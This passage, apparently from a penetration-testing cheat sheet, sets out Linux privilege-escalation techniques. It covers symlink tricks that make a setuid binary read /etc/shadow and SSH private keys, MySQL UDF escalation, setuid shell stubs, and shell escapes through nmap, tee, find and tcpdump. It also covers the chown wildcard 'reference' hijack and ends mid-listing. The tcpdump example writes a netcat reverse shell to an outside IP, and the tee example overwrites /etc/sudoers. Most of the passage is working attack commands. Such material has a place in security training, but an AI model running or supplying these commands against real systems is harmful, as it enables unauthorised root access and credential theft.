<p>Multiple time, we would find that a suid binary belonging to another user is authorized to read a particular file. For example Let&#8217;s say there&#8217;s a suid binary called readExampleConf which can read a file named example.conf as a suid user. This binary can be tricked into reading any other file by creating a Symlink or a softlink. For example if we want to read /etc/shadow file which can be read by suid user. we can do</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">xxxxxx</span><span class="o">/</span><span class="n">example</span><span class="o">.</span><span class="n">conf</span>
<span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">xxx2</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">xxxxxxx</span><span class="o">/</span><span class="n">example</span><span class="o">.</span><span class="n">conf</span>
</pre></div>
</div>
<p>Now, when we try to read example.conf file, we would be able to read the file for which we created the symlink</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">readExampleConf</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">xxxxxxx</span><span class="o">/</span><span class="n">example</span><span class="o">.</span><span class="n">conf</span>
<span class="o">&lt;</span><span class="n">Contents</span> <span class="n">of</span> <span class="n">shadow</span> <span class="ow">or</span> <span class="n">id_rsa</span>
</pre></div>
</div>
</div>
<div class="section" id="mysql-privileged-escalation">
<h3>MySQL Privileged Escalation<a class="headerlink" href="#mysql-privileged-escalation" title="Permalink to this headline">¶</a></h3>
<p>If mysql ( version 4.x, 5.x ) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize <a class="reference external" href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">User-Defined Function (UDF) Dynamic Library Exploit</a> . A blog named <a class="reference external" href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">Gaining a root shell using mysql user defined functions and setuid binaries</a></p>
<div class="section" id="more-information">
<h4>More Information<a class="headerlink" href="#more-information" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>The MySQL service should really not run as root. The service and all mysql directories should be run and accessible from another account - mysql as an example.</li>
<li>When MySQL is initialized, it creates a master account (root by default) that has all privileges to all databases on MySQL. This root account differs from the system root account, although it might still have the same password due to default install steps offered by MySQL.</li>
<li>Commands can be executed inside MySQL, however, commands are executed as the current logged in user.</li>
</ul>
<div class="highlight-default"><div class="highlight"><pre><span></span>mysql&gt; \! sh
</pre></div>
</div>
</div>
</div>
<div class="section" id="cron-d">
<h3>Cron.d<a class="headerlink" href="#cron-d" title="Permalink to this headline">¶</a></h3>
<p>Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.</p>
<p>Suid.c</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>int main(void) {
setgid(0); setuid(0);
execl(“/bin/sh”,”sh”,0); }
</pre></div>
</div>
<p>or</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span> <span class="p">{</span>
<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">);</span> <span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="sudo-l-permissions">
<h3>SUDO -l Permissions<a class="headerlink" href="#sudo-l-permissions" title="Permalink to this headline">¶</a></h3>
<p>Let&#8217;s see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump,</p>
<div class="section" id="nmap-suid">
<h4>nmap suid<a class="headerlink" href="#nmap-suid" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="o">&lt;</span><span class="p">(</span><span class="n">echo</span> <span class="s1">&#39;require &quot;os&quot;.execute &quot;/bin/sh&quot;&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">interactive</span>
</pre></div>
</div>
</div>
<div class="section" id="tee-suid">
<h4>tee suid<a class="headerlink" href="#tee-suid" title="Permalink to this headline">¶</a></h4>
<p>If tee is suid: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user. If some script is run as root, you may also run. For example, let&#8217;s say tidy.sh is executed as root on the server, we can write the below code in temp.sh</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">temp</span><span class="o">.</span><span class="n">sh</span>
<span class="n">echo</span> <span class="s2">&quot;example_user ALL=(ALL) ALL&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">chmod</span> <span class="o">+</span><span class="n">w</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span> <span class="n">to</span> <span class="n">add</span> <span class="n">write</span> <span class="n">properties</span> <span class="n">to</span> <span class="n">sudoers</span> <span class="n">file</span> <span class="n">to</span> <span class="n">do</span> <span class="n">the</span> <span class="n">above</span>
</pre></div>
</div>
<p>and then</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">temp</span><span class="o">.</span><span class="n">sh</span> <span class="o">|</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">tee</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">cleanup</span><span class="o">/</span><span class="n">tidyup</span><span class="o">.</span><span class="n">sh</span>
</pre></div>
</div>
<p>which will add contents of temp.sh to tidyup.sh. ( Assuming tidyup.sh is running as root by crontab )</p>
</div>
<div class="section" id="tcpdump">
<h4>tcpdump<a class="headerlink" href="#tcpdump" title="Permalink to this headline">¶</a></h4>
<p>The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).</p>
<p>Create a temp.sh ( which contains the commands to executed as root )</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">id</span>
<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">nc</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">110.1</span> <span class="mi">4444</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></div>
</div>
<p>Execute the command</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">W</span> <span class="mi">1</span> <span class="o">-</span><span class="n">G</span> <span class="mi">1</span> <span class="o">-</span><span class="n">z</span> <span class="o">./</span><span class="n">temp</span><span class="o">.</span><span class="n">sh</span> <span class="o">-</span><span class="n">Z</span> <span class="n">root</span>
</pre></div>
</div>
<p>where</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">C</span> <span class="n">file_size</span> <span class="p">:</span> <span class="n">Before</span>  <span class="n">writing</span> <span class="n">a</span> <span class="n">raw</span> <span class="n">packet</span> <span class="n">to</span> <span class="n">a</span> <span class="n">savefile</span><span class="p">,</span> <span class="n">check</span> <span class="n">whether</span> <span class="n">the</span> <span class="n">file</span> <span class="ow">is</span> <span class="n">currently</span> <span class="n">larger</span> <span class="n">than</span> <span class="n">file_size</span> <span class="ow">and</span><span class="p">,</span> <span class="k">if</span> <span class="n">so</span><span class="p">,</span> <span class="n">close</span> <span class="n">the</span> <span class="n">current</span> <span class="n">savefile</span> <span class="ow">and</span> <span class="nb">open</span> <span class="n">a</span> <span class="n">new</span> <span class="n">one</span><span class="o">.</span>  <span class="n">Savefiles</span> <span class="n">after</span> <span class="n">the</span> <span class="n">first</span> <span class="n">savefile</span> <span class="n">will</span> <span class="n">have</span> <span class="n">the</span> <span class="n">name</span> <span class="n">specified</span> <span class="k">with</span> <span class="n">the</span> <span class="o">-</span><span class="n">w</span> <span class="n">flag</span><span class="p">,</span> <span class="k">with</span> <span class="n">a</span> <span class="n">number</span> <span class="n">after</span> <span class="n">it</span><span class="p">,</span> <span class="n">starting</span> <span class="n">at</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">continuing</span> <span class="n">upward</span><span class="o">.</span>  <span class="n">The</span> <span class="n">units</span> <span class="n">of</span> <span class="n">file_size</span> <span class="n">are</span> <span class="n">millions</span> <span class="n">of</span> <span class="nb">bytes</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">000</span><span class="p">,</span><span class="mi">000</span> <span class="nb">bytes</span><span class="p">,</span> <span class="ow">not</span> <span class="mi">1</span><span class="p">,</span><span class="mi">048</span><span class="p">,</span><span class="mi">576</span> <span class="nb">bytes</span><span class="p">)</span><span class="o">.</span>

<span class="o">-</span><span class="n">W</span> <span class="n">Used</span>  <span class="ow">in</span> <span class="n">conjunction</span> <span class="k">with</span> <span class="n">the</span> <span class="o">-</span><span class="n">C</span> <span class="n">option</span><span class="p">,</span> <span class="n">this</span> <span class="n">will</span> <span class="n">limit</span> <span class="n">the</span> <span class="n">number</span> <span class="n">of</span> <span class="n">files</span> <span class="n">created</span> <span class="n">to</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">number</span><span class="p">,</span> <span class="ow">and</span> <span class="n">begin</span> <span class="n">overwriting</span> <span class="n">files</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">beginning</span><span class="p">,</span> <span class="n">thus</span> <span class="n">creating</span> <span class="n">a</span> <span class="s1">&#39;rotating&#39;</span> <span class="n">buffer</span><span class="o">.</span>  <span class="n">In</span> <span class="n">addition</span><span class="p">,</span> <span class="n">it</span> <span class="n">will</span> <span class="n">name</span> <span class="n">the</span> <span class="n">files</span> <span class="k">with</span> <span class="n">enough</span> <span class="n">leading</span> <span class="mi">0</span><span class="n">s</span> <span class="n">to</span> <span class="n">support</span> <span class="n">the</span> <span class="n">maximum</span> <span class="n">number</span> <span class="n">of</span> <span class="n">files</span><span class="p">,</span> <span class="n">allowing</span> <span class="n">them</span> <span class="n">to</span> <span class="n">sort</span> <span class="n">correctly</span><span class="o">.</span> <span class="n">Used</span> <span class="ow">in</span> <span class="n">conjunction</span> <span class="k">with</span> <span class="n">the</span> <span class="o">-</span><span class="n">G</span> <span class="n">option</span><span class="p">,</span> <span class="n">this</span> <span class="n">will</span> <span class="n">limit</span> <span class="n">the</span> <span class="n">number</span> <span class="n">of</span> <span class="n">rotated</span> <span class="n">dump</span> <span class="n">files</span> <span class="n">that</span> <span class="n">get</span> <span class="n">created</span><span class="p">,</span> <span class="n">exiting</span> <span class="k">with</span> <span class="n">status</span> <span class="mi">0</span> <span class="n">when</span> <span class="n">reaching</span> <span class="n">the</span> <span class="n">limit</span><span class="o">.</span> <span class="n">If</span> <span class="n">used</span> <span class="k">with</span> <span class="o">-</span><span class="n">C</span> <span class="k">as</span> <span class="n">well</span><span class="p">,</span> <span class="n">the</span> <span class="n">behavior</span> <span class="n">will</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">cyclical</span> <span class="n">files</span> <span class="n">per</span> <span class="n">timeslice</span><span class="o">.</span>

<span class="o">-</span><span class="n">z</span> <span class="n">postrotate</span><span class="o">-</span><span class="n">command</span> <span class="n">Used</span> <span class="ow">in</span> <span class="n">conjunction</span> <span class="k">with</span> <span class="n">the</span> <span class="o">-</span><span class="n">C</span> <span class="ow">or</span> <span class="o">-</span><span class="n">G</span> <span class="n">options</span><span class="p">,</span> <span class="n">this</span> <span class="n">will</span> <span class="n">make</span> <span class="n">tcpdump</span> <span class="n">run</span> <span class="s2">&quot; postrotate-command file &quot;</span> <span class="n">where</span> <span class="n">file</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">savefile</span> <span class="n">being</span> <span class="n">closed</span> <span class="n">after</span> <span class="n">each</span> <span class="n">rotation</span><span class="o">.</span> <span class="n">For</span> <span class="n">example</span><span class="p">,</span> <span class="n">specifying</span> <span class="o">-</span><span class="n">z</span> <span class="n">gzip</span> <span class="ow">or</span> <span class="o">-</span><span class="n">z</span> <span class="n">bzip</span> <span class="n">will</span> <span class="n">compress</span> <span class="n">each</span> <span class="n">savefile</span> <span class="n">using</span> <span class="n">gzip</span> <span class="ow">or</span> <span class="n">bzip2</span><span class="o">.</span>

<span class="n">Note</span> <span class="n">that</span> <span class="n">tcpdump</span> <span class="n">will</span> <span class="n">run</span> <span class="n">the</span> <span class="n">command</span> <span class="ow">in</span> <span class="n">parallel</span> <span class="n">to</span> <span class="n">the</span> <span class="n">capture</span><span class="p">,</span> <span class="n">using</span> <span class="n">the</span> <span class="n">lowest</span> <span class="n">priority</span> <span class="n">so</span> <span class="n">that</span> <span class="n">this</span> <span class="n">doesn</span><span class="s1">&#39;t disturb the capture process.</span>

<span class="n">And</span> <span class="ow">in</span> <span class="n">case</span> <span class="n">you</span> <span class="n">would</span> <span class="n">like</span> <span class="n">to</span> <span class="n">use</span> <span class="n">a</span> <span class="n">command</span> <span class="n">that</span> <span class="n">itself</span> <span class="n">takes</span> <span class="n">flags</span> <span class="ow">or</span> <span class="n">different</span> <span class="n">arguments</span><span class="p">,</span> <span class="n">you</span> <span class="n">can</span> <span class="n">always</span> <span class="n">write</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">script</span> <span class="n">that</span> <span class="n">will</span> <span class="n">take</span> <span class="n">the</span> <span class="n">savefile</span> <span class="n">name</span> <span class="k">as</span> <span class="n">the</span> <span class="n">only</span> <span class="n">argument</span><span class="p">,</span> <span class="n">make</span> <span class="n">the</span> <span class="n">flags</span> <span class="o">&amp;</span>  <span class="n">arguments</span> <span class="n">arrangements</span> <span class="ow">and</span> <span class="n">execute</span> <span class="n">the</span> <span class="n">command</span> <span class="n">that</span> <span class="n">you</span> <span class="n">want</span><span class="o">.</span>

 <span class="o">-</span><span class="n">Z</span> <span class="n">user</span>
 <span class="o">--</span><span class="n">relinquish</span><span class="o">-</span><span class="n">privileges</span><span class="o">=</span><span class="n">user</span> <span class="n">If</span> <span class="n">tcpdump</span> <span class="ow">is</span> <span class="n">running</span> <span class="k">as</span> <span class="n">root</span><span class="p">,</span> <span class="n">after</span> <span class="n">opening</span> <span class="n">the</span> <span class="n">capture</span> <span class="n">device</span> <span class="ow">or</span> <span class="nb">input</span> <span class="n">savefile</span><span class="p">,</span> <span class="n">but</span> <span class="n">before</span> <span class="n">opening</span> <span class="nb">any</span> <span class="n">savefiles</span> <span class="k">for</span> <span class="n">output</span><span class="p">,</span> <span class="n">change</span> <span class="n">the</span> <span class="n">user</span> <span class="n">ID</span> <span class="n">to</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">group</span> <span class="n">ID</span> <span class="n">to</span> <span class="n">the</span> <span class="n">primary</span> <span class="n">group</span> <span class="n">of</span> <span class="n">user</span><span class="o">.</span>

 <span class="n">This</span> <span class="n">behavior</span> <span class="n">can</span> <span class="n">also</span> <span class="n">be</span> <span class="n">enabled</span> <span class="n">by</span> <span class="n">default</span> <span class="n">at</span> <span class="nb">compile</span> <span class="n">time</span><span class="o">.</span>
</pre></div>
</div>
</div>
<div class="section" id="find">
<h4>find<a class="headerlink" href="#find" title="Permalink to this headline">¶</a></h4>
<p>If find is suid, we can use</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">touch</span> <span class="n">foo</span>
<span class="n">find</span> <span class="n">foo</span> <span class="o">-</span><span class="n">exec</span> <span class="n">whoami</span> \<span class="p">;</span>
</pre></div>
</div>
<p>Here, the foo file ( a blank file ) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.</p>
<p>HollyGrace has mentioned this in <a class="reference external" href="https://www.gracefulsecurity.com/linux-privesc-abusing-suid/">Linux PrivEsc: Abusing SUID</a></p>
<p>More can be learn <a class="reference external" href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">How-I-got-root-with-sudo</a>.</p>
</div>
</div>
<div class="section" id="unix-wildcards">
<h3>Unix Wildcards<a class="headerlink" href="#unix-wildcards" title="Permalink to this headline">¶</a></h3>
<p>The below text is directly from the <a class="reference external" href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">DefenseCode Unix WildCards Gone Wild</a>.</p>
<div class="section" id="chown-file-reference-trick-file-owner-hijacking">
<h4>Chown file reference trick (file owner hijacking)<a class="headerlink" href="#chown-file-reference-trick-file-owner-hijacking" title="Permalink to this headline">¶</a></h4>
<p>First really interesting target I&#8217;ve stumbled across is &#8216;chown&#8217;. Let&#8217;s say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to &#8216;nobody&#8217;. Pay attention to the file owners in the following files list.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">52</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">22</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">34</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">66</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">80</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">config</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">66</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">password</span><span class="o">.</span><span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>Files in this public directory are mostly owned by the user named &#8216;user&#8217;, and root user will now change that to &#8216;nobody&#8217;.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># chown -R nobody:nobody \*.php</span>
</pre></div>
</div>
<p>Let&#8217;s see who owns files now...</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">52</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">22</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">34</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">66</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">80</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">config</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
